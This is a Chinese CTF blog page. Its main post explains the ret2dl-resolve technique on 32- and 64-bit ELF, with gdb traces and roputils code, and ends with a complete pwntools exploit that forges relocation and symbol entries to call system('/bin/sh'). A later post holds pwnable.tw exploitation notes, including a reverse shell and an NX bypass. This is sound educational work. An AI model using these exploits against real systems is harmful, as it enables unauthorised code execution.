<p>可以看到，之前所说的read函数的符号信息条目index确实为1。我们通过调试器来看看其实际内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/4x 0x80481ac+16</span><br><span class="line">0x80481bc:      0x0000001a      0x00000000      0x00000000      0x00000012</span><br></pre></td></tr></table></figure></p>
<p>对比符号条目的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Word    st_name;   /* Symbol name (string tbl index) */</span><br><span class="line">Elf32_Addr    st_value;  /* Symbol value */</span><br><span class="line">Elf32_Word    st_size;   /* Symbol size */</span><br><span class="line">unsigned char st_info;   /* Symbol type and binding */</span><br><span class="line">unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */</span><br><span class="line">Elf32_Section st_shndx;  /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p>
<p>其结果与$ readelf -r, $ readelf -s的结果相符。具体地，st_name保存的是该符号名称在STRTAB，即.dynstr中的地址：</p>
<p>gdb-peda$ x/s 0x804820c+0x1a<br>0x8048226:      “read”<br>而对于其他项，如st_info，st_other等，我还没搞明白对应的意义。但在实际构造时，只需选择和其他相同的值应该即可。</p>
<p>OK，以上便是相关背景知识。现在我们来看看在call read@plt时具体发生了什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure></p>
<p>在第一次调用时，jmp <a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>会跳回read@plt，这是我们已经知道的。接下来，会将参数push到栈上并跳至.got.plt+0x8，这相当于调用以下函数：</p>
<p>_dl_runtime_resolve(link_map, rel_offset);<br>_dl_runtime_resolve则会完成具体的符号解析，填充结果，和调用的工作。具体地。根据rel_offset，找到重定位条目：</p>
<p>Elf32_Rel * rel_entry = JMPREL + rel_offset;<br>根据rel_entry中的符号表条目编号，得到对应的符号信息：</p>
<p>Elf32_Sym <em>sym_entry = SYMTAB[ELF32_R_SYM(rel_entry-&gt;r_info)];<br>再找到符号信息中的符号名称：<br>char </em>sym_name = STRTAB + sym_entry-&gt;st_name;<br>由此名称，搜索动态库。找到地址后，填充至.got.plt对应位置。最后调整栈，调用这一解析得到的函数。<br>于是，我们的思路是，提供一个很大的数作为rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数地址并调用了。值得注意的是，在解析过程中，还会对ELF32_R_TYPE(rel_entry-&gt;r_info)等进行检查。但这些数据我们只需仿照正常的来构造即可，重点是对应的伪条目的index应计算正确。<br>作为实例，我们来看看roputils里是如何构造伪条目的。首先是函数dl_resolve_data。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_data(self, base, name):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line">symtab = self.dynamic(&apos;SYMTAB&apos;)</span><br><span class="line">syment = self.dynamic(&apos;SYMENT&apos;)</span><br><span class="line">strtab = self.dynamic(&apos;STRTAB&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)</span><br><span class="line">addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7</span><br><span class="line">st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">buf = self.fill(padlen_reloc)</span><br><span class="line">buf += struct.pack(&apos;&lt;II&apos;, base, r_info)                      # Elf32_Rel</span><br><span class="line">buf += self.fill(padlen_sym)</span><br><span class="line">buf += struct.pack(&apos;&lt;IIII&apos;, st_name, 0, 0, 0x12)             # Elf32_Sym</span><br><span class="line">buf += self.string(name)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
<p>从base开始便是用户可控的区域，也是用来构造伪Elf32_Rel, 伪Elf32_Sym，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>
<p>其次便是函数dl_resolve_call了。其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    def dl_resolve_call(self, base, *args):</span><br><span class="line">jmprel = self.dynamic(&apos;JMPREL&apos;)</span><br><span class="line">relent = self.dynamic(&apos;RELENT&apos;)</span><br><span class="line"></span><br><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">reloc_offset = addr_reloc - jmprel</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br><span class="line">buf += self.p(self.gadget(&apos;pop&apos;, n=len(args)))</span><br><span class="line">buf += self.p(args)</span><br><span class="line"></span><br><span class="line">return buf</span><br></pre></td></tr></table></figure></p>
<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪Elf32_Rel条目的offset，最后则是.plt起始处的地址，在那里会完成将link_map放至栈上及调用_dl_runtime_resolve。</p>
<p>64位环境下return to dl-resolve<br>相比32位，其实基本原理还是相同的。只是由于位数增加，一些结构体发生变化；此外，函数参数也变成由寄存器传递而非栈传递。</p>
<p>具体地，我们看64位relocation entry的定义。首先通过$ readelf -d可知，现在的类型为RELA，大小RELAENT为24 bytes：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof64</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x7b0 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x4003e0</span><br><span class="line"> 0x000000000000000d (FINI)               0x400634</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600798</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x6007a0</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400260</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x4002f8</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x400280</span><br><span class="line"> 0x000000000000000a (STRSZ)              67 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x600988</span><br><span class="line"> 0x0000000000000002 (PLTRELSZ)           96 (bytes)</span><br><span class="line"> 0x0000000000000014 (PLTREL)             RELA</span><br><span class="line"> 0x0000000000000017 (JMPREL)             0x400380</span><br><span class="line"> 0x0000000000000007 (RELA)               0x400368</span><br><span class="line"> 0x0000000000000008 (RELASZ)             24 (bytes)</span><br><span class="line"> 0x0000000000000009 (RELAENT)            24 (bytes)</span><br><span class="line"> 0x000000006ffffffe (VERNEED)            0x400348</span><br><span class="line"> 0x000000006fffffff (VERNEEDNUM)         1</span><br><span class="line"> 0x000000006ffffff0 (VERSYM)             0x40033c</span><br><span class="line"> 0x0000000000000000 (NULL)               0x0</span><br></pre></td></tr></table></figure></p>
<p>其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef __u16   Elf64_Half;</span><br><span class="line">typedef __u32   Elf64_Word;</span><br><span class="line">typedef __u64   Elf64_Addr;</span><br><span class="line">typedef __u64   Elf64_Xword;</span><br><span class="line">typedef __s64   Elf64_Sxword;</span><br><span class="line"></span><br><span class="line">typedef struct elf64_rela &#123;</span><br><span class="line">Elf64_Addr r_offset;  /* Location at which to apply the action */</span><br><span class="line">Elf64_Xword r_info;   /* index and type of relocation */</span><br><span class="line">Elf64_Sxword r_addend;    /* Constant addend used to compute value */</span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line">#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span><br><span class="line">#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span><br></pre></td></tr></table></figure></p>
<p>相应地，在roputils中，64位下构造伪Elf64_Rela的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r_info = (((addr_sym - symtab) / syment) &lt;&lt; 32) | 0x7</span><br><span class="line"></span><br><span class="line">buf += struct.pack(&apos;&lt;QQQ&apos;, base, r_info, 0)                  # Elf64_Rela</span><br></pre></td></tr></table></figure>
<p>SYMTAB中的条目定义则变化如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf64_sym &#123;</span><br><span class="line">Elf64_Word st_name;       /* Symbol name, index in string tbl */</span><br><span class="line">unsigned char st_info;    /* Type and binding attributes */</span><br><span class="line">unsigned char st_other;   /* No defined meaning, 0 */</span><br><span class="line">Elf64_Half st_shndx;      /* Associated section index */</span><br><span class="line">Elf64_Addr st_value;      /* Value of the symbol */</span><br><span class="line">Elf64_Xword st_size;      /* Associated symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
<p>可以看到，st_info，st_other等的位置被提前了。对应于roputils中的代码则为：</p>
<pre><code>buf += struct.pack(&apos;&lt;IIQQ&apos;, st_name, 0x12, 0, 0)             # Elf64_Sym
</code></pre><p>以上便是相关结构的变更情况。接下来，我们看roputils中传递函数参数的相关代码。</p>
<p>首先，看看64位下.plt中解析函数地址的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x400420 &lt;read@plt&gt;: jmp    QWORD PTR [rip+0x200582]        # 0x6009a8 &lt;read@got.plt&gt;</span><br><span class="line">   0x400426 &lt;read@plt+6&gt;:       push   0x1</span><br><span class="line">   0x40042b &lt;read@plt+11&gt;:      jmp    0x400400</span><br><span class="line">gdb-peda$ x/2i 0x400400</span><br><span class="line">   0x400400:    push   QWORD PTR [rip+0x20058a]        # 0x600990</span><br><span class="line">   0x400406:    jmp    QWORD PTR [rip+0x20058c]        # 0x600998</span><br></pre></td></tr></table></figure>
<p>可以看到，给_dl_runtime_resolve传递的参数仍然是两个，但第二个参数已由之前32位的相对JMPREL的偏移变为该条目的在数组中的index。相应地，roputils在这里也进行了改变：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr_reloc, padlen_reloc = self.align(base, jmprel, relaent)</span><br><span class="line">reloc_offset = (addr_reloc - jmprel) / relaent</span><br><span class="line"></span><br><span class="line">buf = self.p(self.plt())</span><br><span class="line">buf += self.p(reloc_offset)</span><br></pre></td></tr></table></figure>
<p>另外，注意到给_dl_runtime_resolve传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器rdi等中已经存有要解析的函数所需的参数了。具体地，roputils中是通过某些gadget来将所需的参数，如/bin/sh的地址，保存在寄存器中。</p>
<p>然而，阅读roputils的示例代码，我们发现它还会在解析函数地址之前，将link_map+0x1c8处设为NULL。我们试着去掉这一操作，再执行发现遇到segfault了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x40033c --&gt; 0x2000200020000</span><br><span class="line">RBX: 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">RCX: 0x155dc00000007</span><br><span class="line">RDX: 0x155dc</span><br><span class="line">RSI: 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">RDI: 0x4002f8 --&gt; 0x6f732e6362696c00 (&apos;&apos;)</span><br><span class="line">RBP: 0x0</span><br><span class="line">RSP: 0x600da8 --&gt; 0x0</span><br><span class="line">RIP: 0x7ffff7de9448 (&lt;_dl_fixup+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2])</span><br><span class="line">R8 : 0x600f00 --&gt; 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">R9 : 0x7ffff7dea4e0 (&lt;_dl_fini&gt;:        push   rbp)</span><br><span class="line">R10: 0x7ffff7ffe130 --&gt; 0x0</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x0</span><br><span class="line">R13: 0x0</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7de943b &lt;_dl_fixup+107&gt;:      test rax,rax</span><br><span class="line">   0x7ffff7de943e &lt;_dl_fixup+110&gt;:      je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x7ffff7de9444 &lt;_dl_fixup+116&gt;:      mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x7ffff7de9448 &lt;_dl_fixup+120&gt;:      movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x7ffff7de944c &lt;_dl_fixup+124&gt;:      and    eax,0x7fff</span><br><span class="line">   0x7ffff7de9451 &lt;_dl_fixup+129&gt;:      lea    rdx,[rax+rax*2]</span><br><span class="line">   0x7ffff7de9455 &lt;_dl_fixup+133&gt;:      mov    rax,QWORD PTR [r10+0x2e0]</span><br><span class="line">   0x7ffff7de945c &lt;_dl_fixup+140&gt;:      lea    r8,[rax+rdx*8]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x600da8 --&gt; 0x0</span><br><span class="line">0008| 0x600db0 --&gt; 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">0016| 0x600db8 --&gt; 0x0</span><br><span class="line">0024| 0x600dc0 --&gt; 0x0</span><br><span class="line">0032| 0x600dc8 --&gt; 0x0</span><br><span class="line">0040| 0x600dd0 --&gt; 0x7ffff7defd00 (&lt;_dl_runtime_resolve+80&gt;:    mov    r11,rax)</span><br><span class="line">0048| 0x600dd8 (&quot;jweM5ZXF&quot;)</span><br><span class="line">0056| 0x600de0 --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure></p>
<p>这其中，rax=0x40033c是.gnu.version所在。而这里还存在一处检查。查看dl-runtime.c文件，这部分对应的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   /* Look up the target symbol. If the normal lookup rules are not</span><br><span class="line">used don&apos;t look in the global scope. */</span><br><span class="line">if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</span><br><span class="line">&#123;</span><br><span class="line">const struct r_found_version *version = NULL;</span><br><span class="line"></span><br><span class="line">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">const ElfW(Half) *vernum =</span><br><span class="line">(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">if (version-&gt;hash == 0)</span><br><span class="line">version = NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里，应该是由于我们构造的伪symbol的index过大，使得vernum[ELFW(R_SYM) (reloc-&gt;r_info)]读取出错。为了绕过这部分，roputils选择的方法便是令l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL。相关的汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7de9434 &lt;+100&gt;:   mov    rax,QWORD PTR [r10+0x1c8]</span><br><span class="line">   0x00007ffff7de943b &lt;+107&gt;:   test rax,rax</span><br><span class="line">   0x00007ffff7de943e &lt;+110&gt;:   je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x00007ffff7de9444 &lt;+116&gt;:   mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x00007ffff7de9448 &lt;+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x00007ffff7de944c &lt;+124&gt;:   and    eax,0x7fff</span><br></pre></td></tr></table></figure>
<p>这里的r10保存的便是link_map的地址，所以只需QWORD PTR [r10+0x1c8]处为NULL即可跳过这一段。这便是roputils中这一操作的由来。</p>
<p>完整EXP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"> </span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"> </span><br><span class="line">ppp_ret = <span class="number">0x080484e9</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x080484eb</span></span><br><span class="line">leave_ret = <span class="number">0x080483a8</span></span><br><span class="line"> </span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">bss_addr = <span class="number">0x0804a020</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x804843B</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">200</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x080482f0</span><span class="comment">#plt addr</span></span><br><span class="line">ret_plt = <span class="number">0x080482b0</span><span class="comment">#jmprel</span></span><br><span class="line"> </span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - ret_plt</span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822c</span></span><br><span class="line"> </span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">16</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(plt_0)</span><br><span class="line">payload += p32(index_offset)</span><br><span class="line">payload += <span class="string">'AAAA'</span></span><br><span class="line">payload += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">8</span></span><br><span class="line">payload += fake_reloc</span><br><span class="line">payload += align * <span class="string">"B"</span></span><br><span class="line">payload += fake_sym</span><br><span class="line">payload += <span class="string">"systemx00"</span></span><br><span class="line">payload += <span class="string">"A"</span> * (<span class="number">80</span> - len(payload))</span><br><span class="line">payload += cmd + <span class="string">'x00'</span></span><br><span class="line">payload += <span class="string">"A"</span>*(<span class="number">200</span> - len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">'A'</span> * (offset)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)  <span class="comment">#mov esp, ebp; pop ebp; ret</span></span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.117Z"><a href="/2018/10/21/pwnable.tw/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h1><pre><code>+可以绕过%u %d而不更改数据
</code></pre><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><pre><code>;sh 可以在字节数不够的情况下使用
_free_hook
和_malloc_hook也可以覆盖
</code></pre><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><pre><code>/proc/self/maps可以查看当前程序heap和程序内存
/proc/self/mem可以读写当前程序内存
</code></pre><h1 id="BabyStack"><a href="#BabyStack" class="headerlink" title="BabyStack"></a>BabyStack</h1><pre><code>one_gadget (execve)可以应对只有eip可以覆盖
</code></pre><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><pre><code>栈写入后调用函数，信息还在
canary每次不会变
</code></pre><h1 id="Starbound"><a href="#Starbound" class="headerlink" title="Starbound"></a>Starbound</h1><pre><code>堆栈结合rop
</code></pre><h1 id="Secret-Garden"><a href="#Secret-Garden" class="headerlink" title="Secret Garden"></a>Secret Garden</h1><pre><code>double free 可以双悬挂在只有malloc的情况下uaf
_malloc_hook前面凑7f
这道题double free双悬挂凑uaf然后伪造堆块
跳到_IO_list_all前面的7f改为main_arena然后放到
unsortbin一个伪造io然后跳system
</code></pre><h1 id="Kidding"><a href="#Kidding" class="headerlink" title="Kidding"></a>Kidding</h1><pre><code>反弹shell绕过无法直接回显的题    
打开套接字dup进行文件描述符复制
將__stack_prot設為7。
將__libc_stack_end的address放入eax中。
_调用_dl_make_stack_executable。
关闭nx
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.116Z"><a href="/2018/10/21/patch/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/patch/">patch</a></h1>
  

    </header>
    <div class="entry">
      
        <p>转自peda</p>
